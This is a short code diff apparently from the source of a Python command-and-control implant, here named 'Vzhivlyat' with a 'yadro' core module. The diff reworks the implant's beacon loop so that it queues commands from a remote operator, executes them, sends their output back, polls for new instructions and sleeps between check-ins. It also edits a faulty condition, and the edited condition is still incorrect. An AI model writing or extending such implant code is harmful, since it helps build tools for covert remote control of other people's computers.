@@ -40,6 +40,7 @@ class Vzhivlyat(object):
         self.transport = None
         self.manifest = None
         self.cmd_queue = []
+        self.cmd_processing_queue = []
         self.cmd_done_queue = []
 
     def decrypt_config(self):
@@ -70,16 +71,22 @@ vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_co
 vzhivlyat.prepare_manifest()
 
 while True:
+    if len(vzhivlyat.cmd_processing_queue) > 0:
+        # TODO: Execute the commands, move them into cmd_done_queue
+        yadro.run_instructions(vzhivlyat)
     if len(vzhivlyat.cmd_done_queue) > 0:
         transport_frame = yadro.send_cmd_output(vzhivlyat)
-    else:
-        transport_frame = yadro.request_instructions(vzhivlyat)
+        frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
+    transport_frame = yadro.request_instructions(vzhivlyat)
     if transport_frame is None or 0:
         pass
     else:
         data = frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
         del transport_frame
-        if data is not 0 or None:
+        if data is not (0 or None):
             yadro.relay_reply(vzhivlyat, data)
+    # Check to see if we have commands to execute
+    if len(vzhivlyat.cmd_queue) > 0:
+        yadro.process_commands(vzhivlyat)
     vzhivlyat.logging.log(f"Waiting for {vzhivlyat.check_time}", level="debug")
     sleep(int(vzhivlyat.check_time))
